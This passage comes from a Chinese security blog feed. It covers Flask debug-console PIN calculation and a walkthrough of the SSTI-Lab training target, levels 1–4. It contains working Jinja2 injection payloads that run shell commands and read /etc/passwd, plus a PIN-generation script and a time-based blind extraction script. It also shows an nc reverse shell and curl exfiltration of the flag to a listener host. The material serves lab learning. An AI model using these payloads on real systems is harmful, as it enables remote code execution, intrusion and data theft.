class="hljs-punctuation">-</span>fU4CHx4_ABsUm1d.Z7iVHg.OyTfaVtPY8mLno<span class="hljs-punctuation">-</span>nCvMBfcnai0k<br><br>结果：<br>&#123;&#x27;_fresh&#x27;<span class="hljs-punctuation">:</span> True<span class="hljs-punctuation">,</span> &#x27;_id&#x27;<span class="hljs-punctuation">:</span> b&#x27;bfc<span class="hljs-number">089165</span>9a23f0ab<span class="hljs-number">4892</span>7d0d0a9ae951c4a<span class="hljs-number">218757</span>ebff136a62dca<span class="hljs-number">06743185</span>bda2c19bfd1e81bb979c9c<span class="hljs-number">124747</span>b56a47d6a6c1e84aec87de5df<span class="hljs-number">1822</span>f03a08a0&#x27;<span class="hljs-punctuation">,</span> &#x27;csrf_token&#x27;<span class="hljs-punctuation">:</span> b&#x27;ba14b408cc8a2d3f<span class="hljs-number">7838</span>1d1c2adbfe<span class="hljs-number">521074</span>4b28&#x27;<span class="hljs-punctuation">,</span> &#x27;image&#x27;<span class="hljs-punctuation">:</span> b&#x27;L9Oe&#x27;<span class="hljs-punctuation">,</span> &#x27;name&#x27;<span class="hljs-punctuation">:</span> &#x27;matrix&#x27;<span class="hljs-punctuation">,</span> &#x27;user_id&#x27;<span class="hljs-punctuation">:</span> &#x27;10&#x27;&#125;<br></code></pre></td></tr></table></figure><h1 id="PIN码计算"><a href="#PIN码计算" class="headerlink" title="PIN码计算"></a>PIN码计算</h1><p>对于有文件包含或文件读取的漏洞，且开启debug功能，可尝试本地构造pin码进入控制台</p><p>输入pin码后即可输入命令执行   </p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132245953.png" alt="image-20250713002222245"></p><p>可参考：</p><p><a href="https://segmentfault.com/a/1190000042254626">深入浅出Flask PIN - 蚁景网安实验室 - SegmentFault 思否</a></p><p><a href="https://www.cnblogs.com/icfh/p/17607277.html">Flask PIN码分析和总结 - Icfh - 博客园</a></p><p>1、<code>username</code> –&gt; 执行代码时候的用户名</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import getpass<br>username = getpass<span class="hljs-selector-class">.getuser</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(username)</span></span><br></code></pre></td></tr></table></figure><p>2、<code>getattr(app, &quot;__name__&quot;, app.__class__.__name__)</code> –&gt; 默认为Flask</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-title">app</span> = <span class="hljs-type">Flask</span>(__name__)<br><br><span class="hljs-title">print</span>(getattr(app, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-keyword">type</span>(app).name))<br></code></pre></td></tr></table></figure><p>获取的是当前app对象的<code>__name__</code>属性，若不存在则获取类的<code>__name__</code>属性，默认为Flask</p><p>3、<code>modname</code> –&gt; 固定值默认flask.app</p><figure class="highlight plaintext"><figcaption><span>sys</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs import">from flask import Flask<br>import typing as t<br><br>app = Flask(__name__)<br><br>modname = getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)<br>mod = sys.modules.get(modname)<br>print(mod)<br></code></pre></td></tr></table></figure><p>取的是app对象的<code>__module__</code>属性，若不存在的话取类的<code>__module__</code>属性，默认为flask.app。</p><p>4、<code>getattr(mod,&quot;__file__&quot;, None)</code> –&gt;app.py文件所在路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br><br>app = Flask(__name__)<br><br>modname = <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__module__&quot;</span>, t.cast(<span class="hljs-built_in">object</span>, app).__class__.__module__)<br>mod = sys.modules.get(modname)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>))<br></code></pre></td></tr></table></figure><p>mod的<code>__file__</code>属性，即app.py文件所在路径</p><p>输出:<code>C:/Users/mcc06/Downloads/sstlabs-master/venv/lib/site-packages/flask/app.py</code></p><p>5、<code>str(uuid.getnode())</code> –&gt;电脑上mac地址</p><p>实际上就是当前网卡的物理地址的整型</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">uuid</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-title">str</span>(<span class="hljs-title">hex</span>(<span class="hljs-variable">uuid.getnode</span>())))</span><br></code></pre></td></tr></table></figure><p>6、<code>get_machine_id()</code> –&gt;根据操作系统不同，有四种获取方式</p><p>Python flask版本不同，读取顺序也不同</p><table><thead><tr><th>操作系统&#x2F;容器</th><th>位置</th><th>取法</th></tr></thead><tbody><tr><td>Linux</td><td>&#x2F;etc&#x2F;machine-id，&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</td><td>前者固定后者不固定</td></tr><tr><td>docker</td><td>&#x2F;proc&#x2F;self&#x2F;cgroup</td><td>正则分割</td></tr><tr><td>macOS</td><td>ioreg -c IOPlatformExpertDevice -d 2</td><td><code>&quot;serial-number&quot; = &lt;ID&gt;</code>部分</td></tr><tr><td>windows</td><td>HKEY_LOCAL_MACHINE&#x2F;SOFTWARE&#x2F;Microsoft&#x2F;Cryptography&#x2F;MachineGuid]</td><td>注册表</td></tr></tbody></table><p>然后直接用下面脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;nobody&#x27;</span>,  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.6/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 利用报错得到 app.py 的位置</span><br>]<br><br><br>private_bits = [<br>    <span class="hljs-string">&#x27;95530043904&#x27;</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address 转换为十进制，可以用下面的函数</span><br>    <span class="hljs-string">&#x27;111&#x27;</span>  <span class="hljs-comment"># machine-id 使用下面的方法获得</span><br><br>]<br><br><span class="hljs-comment"># 将/sys/class/net/eth0/address 转换为十进制</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_decimal</span>(<span class="hljs-params">mac_address: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    将MAC地址（如 &#x27;00:16:3e:08:ca:00&#x27;）转换为十进制整数。</span><br><span class="hljs-string">    :param mac_address: 字符串格式的MAC地址</span><br><span class="hljs-string">    :return: 十进制整数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    hex_str = mac_address.replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    decimal = <span class="hljs-built_in">int</span>(hex_str, <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(decimal)<br><br><span class="hljs-comment"># mac = &quot;00:16:3e:08:ca:00&quot;</span><br><span class="hljs-comment"># mac_to_decimal(mac)</span><br><br><span class="hljs-comment"># 获得machine-id方法</span><br><span class="hljs-comment"># 1. Linux 系统：/etc/machine-id (docker 环境忽略)</span><br><span class="hljs-comment"># 2. docker：/proc/sys/kernel/random/boot_id 拼接 /proc/self/cgroup</span><br><span class="hljs-comment"># 在 Kubernetes/Docker 环境 下，Flask 的 machine-id 生成逻辑是：machine_id = boot_id + 容器ID。</span><br><span class="hljs-comment"># boot_id：/proc/sys/kernel/random/boot_id；容器 ID：从 /kubepods/ 开始，最后一个 / 后的部分就是容器 ID。</span><br><span class="hljs-comment"># 其余操作系统见上</span><br><br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br><br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(<br>                num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>            )<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI-Lab全详解</title>
    <link href="/2025/07/13/SSTI-Lab%E5%85%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/07/13/SSTI-Lab%E5%85%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近做到了SSTI的题，但弄得并不是很懂，所以这里找sstilabs靶场训练一下。</p><p>sstilabs本来应该有3种类型的题目，但目前只出了flask的。如果想要更全的题型，可以去看看websitesVulnerableToSSTI（这俩靶场都可以在github上找到）。</p><h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>这一关no waf，我们直接注入即可。</p><p>这里提一下SSTI常用注入模块。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357782.png" alt="image-20250215213907779"></p><p>我们这里用第三种，</p><p>首先我们需要写脚本判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://192.168.230.133:18080/flasklab/level/1&#x27;</span><span class="hljs-comment"># 请输入URL链接</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>    data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;].__init__.__globals__&#125;&#125;&quot;</span>&#125;<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.post(url, data=data)<br>        <span class="hljs-comment"># print(response.text)</span><br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.py&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-comment"># print(response.text)</span><br>                <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">需要修改URL和data</span><br><span class="hljs-string">利用方式：&#123;&#123;().__class__.__base__.__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&quot;cat /etc/passwd&quot;).read()&#125;&#125;</span><br><span class="hljs-string">注意：这里的199是脚本求出来的，而且脚本求的未必正确，有时候要多试几次</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357586.png" alt="image-20250216102621740"></p><p>上面的数字都可以试，不过有部分可能不好使，这里我们试试199，</p><p><code>&#123;&#123;().__class__.__base__.__subclasses__()[199].__init__.__globals__['os'].popen("cat flag").read()&#125;&#125;</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357320.png" alt="image-20250216102801393"></p><p>还有更方便的方法，就是从内置函数中直接调用os模块，例如下面几种</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;<br><br>&#123;&#123;url_for.__globals__.os.popen(<span class="hljs-string">&quot;ls&quot;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>这样就不用写脚本从各个subclasses中找os模块了。</p><p>这里我们提一下常见的内置函数和内置对象（后面会用到，这里简单了解）</p><table><thead><tr><th>类型</th><th>名称&#x2F;方法</th><th>描述</th><th>典型用途或示例</th></tr></thead><tbody><tr><td><strong>内置函数</strong></td><td><code>lipsum</code></td><td>用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。</td><td>模板中填充测试内容：<code>&#123;&#123; lipsum() &#125;&#125;</code>。</td></tr><tr><td></td><td><code>url_for</code></td><td>根据视图函数名生成对应的 URL 路径，支持动态参数。</td><td>生成链接：<code>&lt;a href=&quot;&#123;&#123; url_for('home') &#125;&#125;&quot;&gt;Home&lt;/a&gt;</code>。</td></tr><tr><td></td><td><code>get_flashed_messages</code></td><td>获取通过 <code>flash()</code> 方法设置的闪现消息，通常用于一次性提示（如成功&#x2F;错误消息）。</td><td>显示消息：<code>&#123;% for msg in get_flashed_messages() %&#125;&#123;&#123; msg &#125;&#125;&#123;% endfor %&#125;</code>。</td></tr><tr><td><strong>内置对象</strong></td><td><code>cycler</code></td><td>Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td><td>标记交替行：<code>&#123;% set cycle = cycler("odd", "even") %&#125;</code>。</td></tr><tr><td></td><td><code>joiner</code></td><td>Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td><td>拼接列表：<code>&#123;% set j = joiner(", ") %&#125;&#123;% for item in list %&#125;&#123;&#123; j() &#125;&#125;&#123;&#123; item &#125;&#125;`。 ||              | `namespace`            | 用于在模板中创建变量命名空间，避免变量冲突。                 | 定义局部变量：`&#123;% ns = namespace(count=0) %&#125;`。              ||              | `config`               | 包含 Flask 应用的配置信息（如 `SECRET_KEY`、数据库连接等）。 | 读取配置：`&#123;&#123; config['SECRET_KEY'] &#125;&#125;`（需注意敏感信息泄露风险）。 ||              | `request`              | 封装当前 HTTP 请求的详细信息（参数、头、Cookies 等）。       | 获取 GET 参数：`&#123;&#123; request.args.get('id') &#125;&#125;`。              ||              | `session`              | 用于读写用户会话数据（基于 Cookie 加密存储）。               | 存储用户状态：`&#123;&#123; session['username'] &#125;&#125;`。                  || **利用方法** | 调用 `current_app`     | 通过 `current_app` 访问应用上下文，可间接获取配置或扩展对象（如数据库连接）。 | 查看配置：`&#123;&#123; current_app.config['DEBUG'] &#125;&#125;`。              ||              | 绕过字符串过滤         | 利用 `request.args`、字符串拼接或 `chr()` 动态构造被过滤的关键字（如 `__class__`）。 | 构造 `__class__`：`&#123;&#123; ''['__cla' ~ 'ss__'] &#125;&#125;`。             |**注意：**`.`可以与`['']`互相替换，比如`__globals__['os']`可以换为`__globals__.os`，所以下面两句是等价的<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br><br>&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>![image-20250215214438190](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132357234.png)# Level 2这关过滤&#123;&#123;&#125;&#125;，我们可以用&#123;%%&#125;代替，但是要注意使用print输出`&#123;%print lipsum.__globals__.os.popen('cat flag').read()%&#125;`或者`&#123;%print(lipsum.__globals__.os.popen('cat flag').read())%&#125;`![image-20250215215323534](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132359767.png)# Level 3这一关没回显。这种情况下我们往往考虑三种方法：1. 反弹shell2. 带外注入（DNSlog、wget等）3. 盲注我们每种都试一下。**第一种方法，**先在kali上开启监听`nc -lvp 7777`然后执行`&#123;&#123;lipsum.__globals__.os.popen('nc 192.168.230.133 7777 -e /bin/bash')&#125;&#125;`![image-20250714000047751](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507140000471.png)反弹shell成功![image-20250215220409424](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358843.png)**第二种方法，**sstilabs应该是不出网的，用DNSlog有些困难了这里在kali里用python开启一个http服务<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>然后去访问<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__.os.popen(<span class="hljs-string">&#x27;curl http://192.168.230.133/`cat flag | xxd -p`&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure>![image-20250215222441088](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358397.png)这里一开始单纯使用`cat flag`，但是发现特殊符号会消失（比如&#123;&#125;），所以改为16进制输出`cat flag | xxd -p`![image-20250215222627980](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358267.png)**第三种，**这里直接写出脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">payload</span>):<br>    postdata = &#123;<br>        <span class="hljs-string">&#x27;code&#x27;</span>: payload<br>    &#125;<br>    start_time = time.time()<br>    response = requests.post(url, data=postdata)<br>    end_time = time.time()<br>    elapsed_time = end_time - start_time<br>    <span class="hljs-comment"># 如果响应时间超过1秒，则认为条件为真</span><br>    <span class="hljs-keyword">if</span> elapsed_time &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>password = <span class="hljs-string">&#x27;&#x27;</span><br>s = <span class="hljs-string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-comment"># 使用时间盲注的payload，通过执行系统命令 sleep 1 来引入延迟</span><br>        payload = <span class="hljs-string">&#x27;&#123;% if lipsum.__globals__.os.popen(&quot;cat flag&quot;).read()[&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;] == &quot;&#x27;</span> + c + <span class="hljs-string">&#x27;&quot; and lipsum.__globals__.os.popen(&quot;sleep 1&quot;).read() %&#125;&#123;% endif %&#125;&#x27;</span><br>        <span class="hljs-keyword">if</span> check(payload):<br>            password += c<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(password)<br><span class="hljs-comment">#需要修改URL和postdata</span><br></code></pre></td></tr></table></figure>![image-20250215224842500](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358176.png)# Level 4这一关过滤中括号我们第一关提到：`.`可以与`['']`互相替换，比如`__globals__['os']`可以换为`__globals__.os`，其实，`['']`还可以用`__getintm__('')`替换，即`__globals__['os']`可以换为`__globals__.__getitem__('os')`。此外还有更多的方法，这里把常见的获取键值或下标的方式进行总结（可以知道，这些都是等价的）。**获取键值或下标的方式**（下面的\_\_builtins\_\_及0仅作为例子，实际应用请更换）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span>.__builtins__<br><span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br><span class="hljs-built_in">dict</span>.get(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.pop(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.__getitem__(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><span class="hljs-built_in">dict</span>.setdefault(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br><br><span class="hljs-built_in">list</span>[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">list</span>.__getitem__(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">list</span>.pop(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>**获取属性的方式**<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">().<span class="hljs-emphasis">__class__</span><br>()[&quot;<span class="hljs-emphasis">__class__</span>&quot;]<br>()|attr(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br>().<span class="hljs-emphasis">__getattribute__</span>(&quot;<span class="hljs-emphasis">__class__</span>&quot;)<br></code></pre></td></tr></table></figure>payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`中虽然本来就没有中括号，但是第一关提到的`&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;`中有，根据上面，我们可以换为（其中，pop要谨慎使用，使用一次就会弹出，所以仅有一次机会，这里不建议使用）：<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.get</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.pop</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.__getitem__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.setdefault</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span 